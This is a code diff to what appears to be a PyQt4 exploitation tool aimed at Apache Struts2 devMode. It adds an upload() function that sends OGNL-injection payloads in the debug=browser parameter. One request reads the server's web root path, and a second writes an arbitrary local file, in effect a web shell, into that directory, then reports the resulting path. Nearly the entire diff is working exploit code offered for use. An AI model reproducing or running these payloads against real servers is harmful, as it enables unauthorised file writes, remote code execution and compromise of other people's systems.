@@ -5,6 +5,7 @@ from s2devmode import Ui_MainWindow
 import urllib.request
 import urllib.parse
 import urllib
+import requests
 
 class StartQt4(QtGui.QMainWindow):
     def __init__(self, parent=None):
@@ -64,7 +65,38 @@ class StartQt4(QtGui.QMainWindow):
             import codecs
             text = codecs.open(self.file, "r", "utf-8").read() #弹出文件选择对话框
         self.filename = str(self.ui.filename.text())
-           
+
+    def upload(self):
+        get_path = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23req.getRealPath(%23c),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23parameters.content[0]),%23hh.getWriter().println(%23b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&reqobj=%2f&reqobj=111&content="
+        target_url = (self.address + get_path)
+        try:
+            req = urllib.request.Request(target_url, method = "GET")
+            response = urllib.request.urlopen(req) 
+            if response:
+                data = response.read()
+                data = str(data, encoding = "utf-8")
+        except Exception as e:
+            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
+        data = data.strip()
+        #print(data)
+        shellpath = data
+        content = (open(self.file, "r").read())
+        #print(content)
+        temp = "&reqobj=%s&reqobj=%s&content=%s" %(shellpath + "/" + self.filename, shellpath + "/" + self.filename, content)
+        #print(temp)
+        payload = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS),%23a%3d%23parameters.reqobj[0],%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a),%23b%3d%23parameters.reqobj[1],%23fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23parameters.content[0].getBytes()),%23fos.close(),%23hh%3d%23context.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23parameters.reqobj[2]),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23xx:%23request.toString&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&"
+        target_url = (self.address + payload + temp)
+        #print(target_url)
+        try:
+            #print(target_url)
+            req = requests.get(target_url)
+            data = req.content
+            #print(data)
+            data = str(data, encoding = "utf-8")
+            self.ui.textBrowser.setText("上传成功，文件路径是：\n%s" %(shellpath + "/" + self.filename)) #将结果输出至textBrowser
+        except Exception as e:
+            self.ui.textBrowser.setText("出现错误，错误回显为：%s" %(e))
+            
     def mode(self):
         self.ui.comboBox.currentIndex()
             
